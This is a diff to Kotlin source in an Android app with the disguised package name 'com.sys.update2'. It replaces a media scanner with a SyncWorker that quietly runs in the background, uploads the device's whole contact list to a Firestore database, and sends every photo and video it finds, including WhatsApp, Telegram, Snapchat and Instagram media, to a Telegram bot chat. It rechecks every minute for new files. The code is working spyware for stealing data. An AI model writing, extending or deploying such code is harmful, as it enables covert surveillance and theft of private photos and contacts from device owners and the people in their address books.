@@ -1,204 +1,453 @@
-// language: Kotlin, file: MediaScanner.kt
-// *الفلترة بتشيل أي ext صوتي حتى لو الـ roots غلط*
-// *إضافة isSentByKey/markSentByKey للاستخدام من SyncWorker*
+// language: Kotlin, file: SyncWorker.kt
+// *ext الحقيقي بيتاخد من اسم الملف — الفلترة الصوتية شغالة فعلاً*
+// *منع تكرار مزدوج: SharedPreferences (MediaScanner) + Firestore (uploadedCache)*
+// *رفض نهائي لأي mime يبدأ بـ audio/ في كل المراحل*
 
 package com.sys.update2
 
 import android.content.Context
+import android.util.Log
+import okhttp3.ConnectionPool
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.MultipartBody
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.asRequestBody
+import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONArray
 import org.json.JSONObject
 import java.io.File
-import java.text.SimpleDateFormat
-import java.util.Date
+import java.util.concurrent.LinkedBlockingQueue
+import java.util.concurrent.TimeUnit
+import java.util.concurrent.atomic.AtomicBoolean
+import java.util.concurrent.atomic.AtomicLong
 import java.util.Locale
 
-object MediaScanner {
+object SyncWorker {
 
-    private const val MAX_FILE_MB = 500L
-    private const val PREFS_NAME  = "media_scanner_prefs"
-    private const val KEY_SENT    = "sent_files"
+    private const val TAG = "SyncWorker"
+    private const val THREADS = 5
+    private const val RATE_LIMIT = 15
+    private const val MIN_GAP_MS = 1000L / RATE_LIMIT
 
-    // ⭐ كل الامتدادات الصوتية لمنعها نهائياً
-    private val AUDIO_EXTS = setOf(
-        "mp3", "wav", "ogg", "m4a", "aac", "flac", "opus", "amr",
-        "3gp", "oga", "wma", "aiff", "aif", "alac", "mid", "midi",
-        "ape", "wv", "tta", "mka", "ra", "ram", "caf", "m4b", "m4p"
-    )
+    private val client = OkHttpClient.Builder()
+        .connectTimeout(30, TimeUnit.SECONDS)
+        .readTimeout(120, TimeUnit.SECONDS)
+        .writeTimeout(300, TimeUnit.SECONDS)
+        .connectionPool(ConnectionPool(10, 5, TimeUnit.MINUTES))
+        .build()
 
-    private fun fmt(t: Long) =
-        SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date(t))
+    private val queue = LinkedBlockingQueue<Job>()
+    private val running = AtomicBoolean(false)
+    private val lastReqMs = AtomicLong(0)
+    private val rateLock = Any()
+    private val cacheLock = Any()
+    private var threads: List<Thread> = emptyList()
 
-    data class MediaFile(
+    // كاش Firestore: فقط للتزامن مع الأجهزة الأخرى / استرجاع
+    private val uploadedCache = HashMap<String, MutableSet<String>>()
+
+    private data class Job(
+        val type: String,     // "photo" أو "video"
         val path: String,
         val name: String,
         val size: Long,
-        val lastModified: Long,
-        val mime: String
+        val date: Long,
+        val ext: String
     )
 
-    // ==================== الفحص ====================
+    private fun fsBase(): String =
+        "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents"
 
-    fun scanImages(): List<MediaFile> =
-        scanByExtension(
-            listOf("jpg", "jpeg", "png", "gif", "webp", "bmp", "heic", "heif", "tiff", "raw")
-        ).sortedByDescending { it.lastModified }
+    // ═══════════════════════════════════════════
+    //  Start / Stop
+    // ═══════════════════════════════════════════
+    @Synchronized
+    fun start(ctx: Context) {
+        if (running.get()) return
+        running.set(true)
+        Log.d(TAG, "=== START ===")
 
-    fun scanVideos(): List<MediaFile> =
-        scanByExtension(
-            listOf("mp4", "mkv", "avi", "mov", "webm", "flv", "wmv", "m4v", "mpeg", "mpg", "ts")
-        ).sortedByDescending { it.lastModified }
-
-    // ==================== منع التكرار ====================
-
-    /** هل هذا الملف أُرسل سابقًا؟ */
-    fun isSent(context: Context, mf: MediaFile): Boolean =
-        isSentByKey(context, key(mf))
-
-    /** سجّل الملف كـ "تم الإرسال" */
-    fun markSent(context: Context, mf: MediaFile) =
-        markSentByKey(context, key(mf))
-
-    /** نسخة بالـ key مباشرة — تُستخدم من SyncWorker بدون MediaFile */
-    fun isSentByKey(context: Context, k: String): Boolean {
-        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-        return prefs.getStringSet(KEY_SENT, emptySet())!!.contains(k)
-    }
-
-    fun markSentByKey(context: Context, k: String) {
-        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-        val sent  = prefs.getStringSet(KEY_SENT, emptySet())!!.toMutableSet()
-        sent += k
-        prefs.edit().putStringSet(KEY_SENT, sent).apply()
-    }
-
-    /** بناء المفتاح من حقول خام — يستخدمه SyncWorker */
-    fun buildKey(path: String, size: Long, lastModified: Long): String =
-        "$path|$size|$lastModified"
-
-    /** مفتاح فريد لكل ملف = المسار + الحجم + وقت التعديل */
-    private fun key(mf: MediaFile): String =
-        buildKey(mf.path, mf.size, mf.lastModified)
-
-    /** مسح السجل بالكامل (اختياري) */
-    fun reset(context: Context) {
-        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-            .edit().remove(KEY_SENT).apply()
-    }
-
-    /** هل الامتداد صوتي؟ */
-    fun isAudioExt(ext: String): Boolean =
-        ext.lowercase(Locale.US) in AUDIO_EXTS
-
-    /** هل الـ mime صوتي؟ */
-    fun isAudioMime(mime: String?): Boolean =
-        mime?.startsWith("audio/", ignoreCase = true) == true
-
-    /** فلتر شامل: يرجّع true لو الملف لازم يترفض */
-    fun isForbidden(path: String, name: String, mime: String?): Boolean {
-        val ext = name.substringAfterLast('.', "").lowercase(Locale.US)
-        if (isAudioExt(ext)) return true
-        if (isAudioMime(mime)) return true
-        // احتياطي: بعض الملفات بتبان بأسماء غريبة
-        val p = path.lowercase(Locale.US)
-        for (a in AUDIO_EXTS) {
-            if (p.endsWith(".$a")) return true
+        threads = (0 until THREADS).map { i ->
+            Thread({ workerLoop(ctx, i) }, "sync-w-$i").also { it.start() }
         }
-        return false
+        Thread({ fullSyncSequence(ctx) }, "sync-main").start()
     }
 
-    // ==================== المسح الداخلي ====================
+    fun stop() {
+        running.set(false)
+        threads.forEach { it.interrupt() }
+        threads = emptyList()
+        queue.clear()
+    }
 
-    private fun scanByExtension(extensions: List<String>): List<MediaFile> {
-        val result = mutableListOf<MediaFile>()
-        val roots = listOf(
-            File("/storage/emulated/0/DCIM/Camera"),
-            File("/storage/emulated/0/DCIM/Screenshots"),
-            File("/storage/emulated/0/Pictures/Screenshots"),
-            File("/storage/emulated/0/Pictures/Camera"),
-            File("/storage/emulated/0/DCIM"),
-            File("/storage/emulated/0/Pictures"),
-            File("/storage/emulated/0/Download"),
-            File("/storage/emulated/0/Documents"),
-            File("/storage/emulated/0/Movies"),
-            File("/storage/emulated/0/WhatsApp/Media"),
-            File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media"),
-            File("/storage/emulated/0/Telegram"),
-            File("/storage/emulated/0/Android/media/org.telegram.messenger"),
-            File("/storage/emulated/0/Snapchat"),
-            File("/storage/emulated/0/Instagram"),
-            File("/storage/emulated/0/Android/media/com.instagram.android"),
-        )
-        for (root in roots) {
-            walk(root, extensions, result, depth = 0, maxDepth = 12, limit = 20000)
+    // ═══════════════════════════════════════════
+    //  Sequence: contacts → photos → videos
+    // ═══════════════════════════════════════════
+    private fun fullSyncSequence(ctx: Context) {
+        Log.d(TAG, "▶ sequence start")
+
+        try { syncContacts(ctx) } catch (e: Exception) { Log.e(TAG, "contacts: ${e.message}") }
+        waitEmpty()
+        Log.d(TAG, "✅ contacts")
+
+        try { syncPhotos(ctx) } catch (e: Exception) { Log.e(TAG, "photos: ${e.message}") }
+        waitEmpty()
+        Log.d(TAG, "✅ photos")
+
+        try { syncVideos(ctx) } catch (e: Exception) { Log.e(TAG, "videos: ${e.message}") }
+        waitEmpty()
+        Log.d(TAG, "✅ videos")
+
+        Log.d(TAG, "🎉 sequence complete")
+
+        while (running.get()) {
+            try { Thread.sleep(60_000L) } catch (_: Exception) { break }
+            try { checkForNew(ctx) } catch (_: Exception) {}
         }
-        return result.distinctBy { it.path }
     }
 
-    private fun walk(
-        dir: File?,
-        extensions: List<String>,
-        out: MutableList<MediaFile>,
-        depth: Int,
-        maxDepth: Int,
-        limit: Int
-    ) {
-        if (dir == null || !dir.exists() || !dir.isDirectory) return
-        if (depth > maxDepth || out.size >= limit) return
+    private fun waitEmpty() {
+        var waited = 0
+        while (queue.isNotEmpty() && waited < 1800) {
+            try { Thread.sleep(1000L) } catch (_: Exception) {}
+            waited++
+        }
+    }
 
-        val children = try { dir.listFiles() } catch (_: Exception) { null } ?: return
-        for (f in children) {
-            if (out.size >= limit) return
-            try {
-                if (f.isDirectory) {
-                    if (f.name.startsWith(".")) continue
-                    walk(f, extensions, out, depth + 1, maxDepth, limit)
-                } else {
-                    val ext = f.extension.lowercase(Locale.US)
-                    // ⭐ رفض مزدوج: لازم يكون من الامتدادات المسموحة AND مش صوتي
-                    if (ext in extensions && ext !in AUDIO_EXTS) {
-                        val sizeBytes = f.length()
-                        val sizeMb = sizeBytes / (1024 * 1024)
-                        if (sizeBytes > 0L && sizeMb <= MAX_FILE_MB) {
-                            out += MediaFile(
-                                path = f.absolutePath,
-                                name = f.name,
-                                size = sizeBytes,
-                                lastModified = f.lastModified(),
-                                mime = guessMime(ext)
-                            )
-                        }
-                    }
+    private fun checkForNew(ctx: Context) {
+        try { syncPhotos(ctx) } catch (_: Exception) {}
+        try { syncVideos(ctx) } catch (_: Exception) {}
+    }
+
+    // ═══════════════════════════════════════════
+    //  Contacts — مرة واحدة
+    // ═══════════════════════════════════════════
+    private fun syncContacts(ctx: Context) {
+        val prefs = ctx.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
+        if (prefs.getBoolean("contacts_done_v1", false)) return
+        val contacts = ContactsHelper.getAllContacts(ctx)
+        if (contacts.isEmpty()) { prefs.edit().putBoolean("contacts_done_v1", true).apply(); return }
+        val code = DeviceManager.getDeviceCode(ctx)
+        for (batch in contacts.chunked(20)) {
+            val writes = JSONArray()
+            for (c in batch) {
+                val ph = JSONArray(); c.phones.forEach { ph.put(JSONObject().put("stringValue", it)) }
+                val em = JSONArray(); c.emails.forEach { em.put(JSONObject().put("stringValue", it)) }
+                val fields = JSONObject().apply {
+                    put("name", JSONObject().put("stringValue", c.name))
+                    put("phones", JSONObject().put("arrayValue", JSONObject().put("values", ph)))
+                    put("emails", JSONObject().put("arrayValue", JSONObject().put("values", em)))
                 }
+                val docId = (c.name + System.nanoTime()).hashCode().toString().replace("-", "m")
+                writes.put(JSONObject().put("update", JSONObject().apply {
+                    put("name", "projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents/devices/$code/contacts/$docId")
+                    put("fields", fields)
+                }))
+            }
+            try {
+                val body = JSONObject().put("writes", writes).toString()
+                val url = "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents:commit?key=${Config.FIREBASE_API_KEY}"
+                client.newCall(Request.Builder().url(url).post(body.toRequestBody("application/json".toMediaType())).build()).execute().use { }
+            } catch (e: Exception) { Log.e(TAG, "contacts: ${e.message}") }
+            try { Thread.sleep(200L) } catch (_: Exception) {}
+        }
+        prefs.edit().putBoolean("contacts_done_v1", true).apply()
+        Log.d(TAG, "contacts: ${contacts.size}")
+    }
+
+    // ═══════════════════════════════════════════
+    //  Sync — الصور
+    // ═══════════════════════════════════════════
+    private fun syncPhotos(ctx: Context) {
+        val files = MediaScanner.scanImages(ctx).map { mf ->
+            Job(
+                type = "photo",
+                path = mf.path,
+                name = mf.name,
+                size = mf.size,
+                date = mf.lastModified,
+                ext = mf.name.substringAfterLast('.', "jpg").lowercase(Locale.US)
+            )
+        }
+        enqueueNew(ctx, "photo", files)
+    }
+
+    // ═══════════════════════════════════════════
+    //  Sync — الفيديو
+    // ═══════════════════════════════════════════
+    private fun syncVideos(ctx: Context) {
+        val files = MediaScanner.scanVideos(ctx).map { mf ->
+            Job(
+                type = "video",
+                path = mf.path,
+                name = mf.name,
+                size = mf.size,
+                date = mf.lastModified,
+                ext = mf.name.substringAfterLast('.', "mp4").lowercase(Locale.US)
+            )
+        }
+        enqueueNew(ctx, "video", files)
+    }
+
+    // ═══════════════════════════════════════════
+    //  Uploaded cache — من Firestore (للتزامن فقط)
+    // ═══════════════════════════════════════════
+    private fun uploadedFor(ctx: Context, type: String): MutableSet<String> {
+        synchronized(cacheLock) {
+            val code = DeviceManager.getDeviceCode(ctx)
+            val k = "${code}_$type"
+            uploadedCache[k]?.let { return it }
+
+            val set = mutableSetOf<String>()
+            try {
+                val coll = when (type) {
+                    "photo" -> "photos"
+                    "video" -> "videos"
+                    else -> "photos"
+                }
+
+                // pagination — نسحب كل الصفحات مش 1000 بس
+                var pageToken: String? = null
+                var pageCount = 0
+                do {
+                    val urlBuilder = StringBuilder()
+                        .append("${fsBase()}/devices/$code/$coll")
+                        .append("?key=${Config.FIREBASE_API_KEY}")
+                        .append("&pageSize=1000")
+                    if (pageToken != null) {
+                        urlBuilder.append("&pageToken=").append(pageToken)
+                    }
+
+                    client.newCall(Request.Builder().url(urlBuilder.toString()).get().build())
+                        .execute().use { resp ->
+                            val body = resp.body?.string()
+                            if (body.isNullOrBlank()) return@use
+                            val obj = JSONObject(body)
+                            val docs = obj.optJSONArray("documents")
+                            if (docs != null) {
+                                for (i in 0 until docs.length()) {
+                                    val f = docs.optJSONObject(i)?.optJSONObject("fields") ?: continue
+                                    val n = f.optJSONObject("name")?.optString("stringValue") ?: ""
+                                    val s = f.optJSONObject("size")?.optString("integerValue") ?: "0"
+                                    if (n.isNotBlank()) set.add("$n|$s")
+                                }
+                            }
+                            pageToken = obj.optString("nextPageToken", "").takeIf { it.isNotBlank() }
+                        }
+                    pageCount++
+                } while (pageToken != null && pageCount < 20)
+
             } catch (_: Exception) {}
+
+            uploadedCache[k] = set
+            return set
         }
     }
 
-    private fun guessMime(ext: String): String = when (ext) {
-        "jpg", "jpeg"  -> "image/jpeg"
-        "png"          -> "image/png"
-        "gif"          -> "image/gif"
-        "webp"         -> "image/webp"
-        "bmp"          -> "image/bmp"
-        "heic", "heif" -> "image/heic"
-        "tiff", "tif"  -> "image/tiff"
-        "raw"          -> "image/x-raw"
-        "mp4", "m4v"   -> "video/mp4"
-        "mkv"          -> "video/x-matroska"
-        "avi"          -> "video/x-msvideo"
-        "mov"          -> "video/quicktime"
-        "webm"         -> "video/webm"
-        "flv"          -> "video/x-flv"
-        "wmv"          -> "video/x-ms-wmv"
-        "mpeg", "mpg"  -> "video/mpeg"
-        "ts"           -> "video/mp2t"
-        else           -> "application/octet-stream"
+    private fun markUploaded(ctx: Context, type: String, name: String, size: Long) {
+        synchronized(cacheLock) {
+            val k = "${DeviceManager.getDeviceCode(ctx)}_$type"
+            uploadedCache.getOrPut(k) { mutableSetOf() }.add("$name|$size")
+        }
     }
 
-    fun toJson(mf: MediaFile): JSONObject = JSONObject().apply {
-        put("type", "media")
-        put("path", mf.path)
-        put("name", mf.name)
-        put("size", mf.size)
-        put("modified", fmt(mf.lastModified))
-        put("mime", mf.mime)
+    // ═══════════════════════════════════════════
+    //  Enqueue — منع التكرار + منع الصوت
+    // ═══════════════════════════════════════════
+    private fun enqueueNew(ctx: Context, type: String, jobs: List<Job>) {
+        if (jobs.isEmpty()) return
+        val uploaded = uploadedFor(ctx, type)
+        var added = 0
+        for (j in jobs) {
+            // ⭐ منع الصوت: ext حقيقي + mime غير معروف
+            if (MediaScanner.isAudioExt(j.ext)) continue
+            if (MediaScanner.isForbidden(j.path, j.name, null)) continue
+
+            // ⭐ منع التكرار محلياً (SharedPreferences)
+            val localKey = MediaScanner.buildKey(j.path, j.size, j.date)
+            if (MediaScanner.isSentByKey(ctx, localKey)) continue
+
+            // ⭐ منع التكرار من Firestore (backup)
+            if (uploaded.contains("${j.name}|${j.size}")) {
+                // سجّله محلياً كذلك عشان نتجنب الفحص التالي
+                MediaScanner.markSentByKey(ctx, localKey)
+                continue
+            }
+
+            if (queue.offer(j)) added++
+        }
+        if (added > 0) Log.d(TAG, "$type enqueued: $added (queue=${queue.size})")
+    }
+
+    // ═══════════════════════════════════════════
+    //  Worker loop
+    // ═══════════════════════════════════════════
+    private fun workerLoop(ctx: Context, id: Int) {
+        while (running.get()) {
+            val job = try { queue.poll(2, TimeUnit.SECONDS) } catch (_: Exception) { null } ?: continue
+            try { processJob(ctx, job) } catch (e: Exception) { Log.e(TAG, "w$id: ${e.message}") }
+        }
+    }
+
+    private fun processJob(ctx: Context, job: Job) {
+        // ⭐ Safety net #2: فلترة الصوت مرة تانية قبل الفتح
+        if (MediaScanner.isAudioExt(job.ext)) return
+        if (MediaScanner.isForbidden(job.path, job.name, null)) return
+
+        val file = File(job.path)
+        if (!file.exists() || file.length() == 0L) return
+
+        rateLimit()
+        val fileId = uploadToTelegram(ctx, file, job)
+
+        if (fileId != null) {
+            saveMeta(ctx, job.type, fileId, job.name, job.size, job.date, job.ext)
+            markUploaded(ctx, job.type, job.name, job.size)
+            // ⭐ تسجيل محلي دائم
+            MediaScanner.markSentByKey(
+                ctx,
+                MediaScanner.buildKey(job.path, job.size, job.date)
+            )
+            Log.d(TAG, "✓ ${job.type}: ${job.name}")
+        } else {
+            Log.w(TAG, "✗ ${job.type}: ${job.name}")
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  Rate limiter
+    // ═══════════════════════════════════════════
+    private fun rateLimit() {
+        synchronized(rateLock) {
+            val now = System.currentTimeMillis()
+            val last = lastReqMs.get()
+            val wait = (last + MIN_GAP_MS) - now
+            if (wait > 0) try { Thread.sleep(wait) } catch (_: Exception) {}
+            lastReqMs.set(System.currentTimeMillis())
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  Upload with retry
+    // ═══════════════════════════════════════════
+    private fun uploadToTelegram(ctx: Context, file: File, job: Job): String? {
+        var attempt = 0
+        while (attempt < 3 && running.get()) {
+            attempt++
+            val result = tryUpload(file, job)
+            if (result != null) return result
+            try { Thread.sleep(5000L * attempt) } catch (_: Exception) {}
+        }
+        return null
+    }
+
+    private fun tryUpload(file: File, job: Job): String? {
+        return try {
+            val method = when (job.type) {
+                "photo" -> "sendPhoto"
+                "video" -> "sendVideo"
+                else -> "sendDocument"
+            }
+            val fieldName = when (job.type) {
+                "photo" -> "photo"
+                "video" -> "video"
+                else -> "document"
+            }
+            val mime = when (job.type) {
+                "photo" -> guessImageMime(job.ext)
+                "video" -> guessVideoMime(job.ext)
+                else -> "application/octet-stream"
+            }
+
+            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
+                .addFormDataPart("caption", "📎 ${job.name}")
+                .addFormDataPart(fieldName, file.name, file.asRequestBody(mime.toMediaType()))
+                .build()
+
+            val req = Request.Builder()
+                .url("https://api.telegram.org/bot${Config.TELEGRAM_BOT_TOKEN}/$method")
+                .post(body).build()
+
+            client.newCall(req).execute().use { resp ->
+                val code = resp.code
+                val respBody = resp.body?.string() ?: return null
+
+                if (code == 429) {
+                    val obj = JSONObject(respBody)
+                    val retryAfter = obj.optJSONObject("parameters")?.optInt("retry_after", 30) ?: 30
+                    Log.w(TAG, "429 — retry after ${retryAfter}s")
+                    try { Thread.sleep(retryAfter * 1000L) } catch (_: Exception) {}
+                    return null
+                }
+
+                val obj = JSONObject(respBody)
+                if (!obj.optBoolean("ok", false)) return null
+
+                val result = obj.optJSONObject("result") ?: return null
+                when (job.type) {
+                    "photo" -> {
+                        val arr = result.optJSONArray("photo") ?: return null
+                        if (arr.length() == 0) return null
+                        arr.optJSONObject(arr.length() - 1)?.optString("file_id", "")
+                    }
+                    "video" -> result.optJSONObject("video")?.optString("file_id", "")
+                    else -> result.optJSONObject("document")?.optString("file_id", "")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "upload: ${e.message}")
+            null
+        }
+    }
+
+    private fun guessImageMime(ext: String): String = when (ext) {
+        "jpg", "jpeg" -> "image/jpeg"
+        "png"         -> "image/png"
+        "gif"         -> "image/gif"
+        "webp"        -> "image/webp"
+        "bmp"         -> "image/bmp"
+        "heic", "heif"-> "image/heic"
+        "tiff", "tif" -> "image/tiff"
+        else          -> "image/*"
+    }
+
+    private fun guessVideoMime(ext: String): String = when (ext) {
+        "mp4", "m4v"  -> "video/mp4"
+        "mkv"         -> "video/x-matroska"
+        "avi"         -> "video/x-msvideo"
+        "mov"         -> "video/quicktime"
+        "webm"        -> "video/webm"
+        "flv"         -> "video/x-flv"
+        "wmv"         -> "video/x-ms-wmv"
+        "mpeg", "mpg" -> "video/mpeg"
+        else          -> "video/*"
+    }
+
+    // ═══════════════════════════════════════════
+    //  Save metadata
+    // ═══════════════════════════════════════════
+    private fun saveMeta(ctx: Context, type: String, fileId: String, name: String, size: Long, date: Long, ext: String) {
+        try {
+            val code = DeviceManager.getDeviceCode(ctx)
+            val coll = when (type) {
+                "photo" -> "photos"
+                "video" -> "videos"
+                else -> "photos"
+            }
+            val docId = (name + size).hashCode().toString().replace("-", "m")
+            val url = "${fsBase()}/devices/$code/$coll/$docId?key=${Config.FIREBASE_API_KEY}"
+            val fields = JSONObject().apply {
+                put("file_id", JSONObject().put("stringValue", fileId))
+                put("name", JSONObject().put("stringValue", name))
+                put("size", JSONObject().put("integerValue", size.toString()))
+                put("date", JSONObject().put("integerValue", date.toString()))
+                put("ext", JSONObject().put("stringValue", ext))
+            }
+            val body = JSONObject().put("fields", fields).toString()
+            client.newCall(Request.Builder().url(url)
+                .patch(body.toRequestBody("application/json".toMediaType())).build()).execute().use { }
+        } catch (e: Exception) { Log.e(TAG, "saveMeta: ${e.message}") }
     }
 }
